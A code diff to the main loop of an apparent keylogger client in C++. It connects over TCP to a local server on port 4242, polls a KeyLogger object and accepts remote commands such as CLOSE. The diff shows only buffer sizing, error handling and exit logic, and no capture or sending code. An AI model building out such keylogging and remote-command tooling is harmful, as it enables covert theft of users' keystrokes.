@@ -1,4 +1,5 @@
 #include <iostream>
+#include <errno.h>
 #include "TCPClient.hpp"
 #include "KeyLoger.hpp"
 
@@ -10,7 +11,7 @@ int main(int argc, char **argv)
 	TCPClient client;
 	unsigned long timestamp;
 	unsigned long chrono;
-	char test[255];
+	char test[sizeof(t_cmd)];
 
 	client.connectToHost("127.0.0.1", "4242");
 	client.unblockSocket();
@@ -19,15 +20,16 @@ int main(int argc, char **argv)
 	timestamp = std::time(nullptr);
 	while (KeyLogger::getInstance().refreshNonBlocking())
 	{
-		int read = client.receiveData(&test, 10);
-		if (read != -1)
+		int read = client.receiveData(&test, sizeof(t_cmd));
+		if (read > 0 && WSAGetLastError() != EAGAIN && WSAGetLastError() != EWOULDBLOCK)
 		{
+			std::cout << "packet size: " << read << std::endl;
 			if (read == sizeof(t_cmd))
 			{
 				t_cmd *command = reinterpret_cast<t_cmd *>(test);
 				if (command->cmd == commandType::CLOSE)
 				{
-					return (0);
+					exit(0);
 				}
 			}
 		}
